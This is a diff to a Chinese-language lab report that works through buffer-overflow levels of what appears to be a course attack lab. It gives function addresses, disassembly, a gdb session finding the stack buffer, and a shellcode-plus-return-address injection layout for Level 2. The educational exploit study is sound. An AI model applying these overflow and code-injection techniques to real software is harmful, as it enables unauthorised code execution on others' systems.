@@ -14,6 +14,13 @@
 
 = 实验目的
 
+= 实验环境
+
+- 操作系统：Linux (Ubuntu 20.04 docker)
+- 编译器：gcc
+- 调试器：gdb
+- 反汇编工具：objdump
+
 = 实验内容
 
 == Level 1: 简单缓冲区溢出
@@ -56,6 +63,7 @@ disas_ctarget:
   8089fa:	bf 00 00 00 00       	mov    edi,0x0
   8089ff:	e8 1c 84 bf ff       	call   400e20 <exit@plt>
 ```
+- 得到 `touch1` 函数的地址为 `0x08089d6`。
 - `getbuf` 函数中调用了 `Gets` 函数从标准输入读取数据到栈上，栈空间大小为 0x18 字节（24 字节）。
 - 所以注入时：写入 24 个字节“垃圾”之后，接下来的 8 个字节就正好覆盖返回地址。
 - 我们写24个A字符作为填充，然后写入 `touch1` 函数的地址 `0x08089d6` 作为新的返回地址。
@@ -80,4 +88,67 @@ Type string:Touch1!: You called touch1()
 Valid solution for level 1 with target ctarget
 PASS: Sent exploit string to server to be validated.
 NICE JOB!
+```
+
+== Level 2: 更复杂的缓冲区溢出
+
+Level 2 要求我们同样利用缓冲区溢出漏洞，覆盖返回地址，此外还要函数第 1 个参数 `%rdi` 设置为 `cookie`；然后 `ret` 到 `touch2` 的入口地址。
+
+首先查看 `touch2` 函数的地址：
+```asm
+0000000000808a04 <touch2>:
+  808a04:	48 83 ec 08          	sub    rsp,0x8
+  808a08:	89 fa                	mov    edx,edi
+  808a0a:	c7 05 e8 3a 20 00 02 	mov    DWORD PTR [rip+0x203ae8],0x2        # a0c4fc <vlevel>
+  808a11:	00 00 00
+  808a14:	39 3d ea 3a 20 00    	cmp    DWORD PTR [rip+0x203aea],edi        # a0c504 <cookie>
+  808a1a:	74 2a                	je     808a46 <touch2+0x42>
+  808a1c:	48 8d 35 35 19 00 00 	lea    rsi,[rip+0x1935]        # 80a358 <_IO_stdin_used+0x2c8>
+  808a23:	bf 01 00 00 00       	mov    edi,0x1
+  808a28:	b8 00 00 00 00       	mov    eax,0x0
+  808a2d:	e8 ae 83 bf ff       	call   400de0 <__printf_chk@plt>
+  808a32:	bf 02 00 00 00       	mov    edi,0x2
+  808a37:	e8 6b 05 00 00       	call   808fa7 <fail>
+  808a3c:	bf 00 00 00 00       	mov    edi,0x0
+  808a41:	e8 da 83 bf ff       	call   400e20 <exit@plt>
+  808a46:	48 8d 35 e3 18 00 00 	lea    rsi,[rip+0x18e3]        # 80a330 <_IO_stdin_used+0x2a0>
+  808a4d:	bf 01 00 00 00       	mov    edi,0x1
+  808a52:	b8 00 00 00 00       	mov    eax,0x0
+  808a57:	e8 84 83 bf ff       	call   400de0 <__printf_chk@plt>
+  808a5c:	bf 02 00 00 00       	mov    edi,0x2
+  808a61:	e8 71 04 00 00       	call   808ed7 <validate>
+  808a66:	eb d4                	jmp    808a3c <touch2+0x38>
+```
+得到 `touch2` 函数的地址为 `0x0808a04`。
+
+下一步，我们需要找到 `getbuf` 函数的栈帧布局
+```log
+❯ gdb ./ctarget
+GNU gdb (GDB) 16.3
+Copyright (C) 2024 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+For help, type "help".
+Reading symbols from ./ctarget...
+(gdb) break getbuf
+Breakpoint 1 at 0x8089c0: file buf.c, line 12.
+(gdb) run
+Cookie: 0x********
+Breakpoint 1, getbuf () at buf.c:12
+warning: 12     buf.c: 没有那个文件或目录
+(gdb) ni
+14      in buf.c
+(gdb) ni
+0x00000000008089c7      14      in buf.c
+(gdb) print/x $rsp
+$1 = 0x5563e958
+```
+这里`rsp` 的值为 `0x5563e958`，我们就得到了 `buf` 缓冲区的起始地址。
+
+于是我们注入的内容如下：
+```
+[ shellcode: movl $cookie,%edi; ret ]  ; 6
+[ padding ]                            ; 18 (补齐 buf[0..23])
+[ new ret = buf 地址 ]                 ; 8
+[ 下一次 ret = touch2 地址 ]          ; 8
 ```
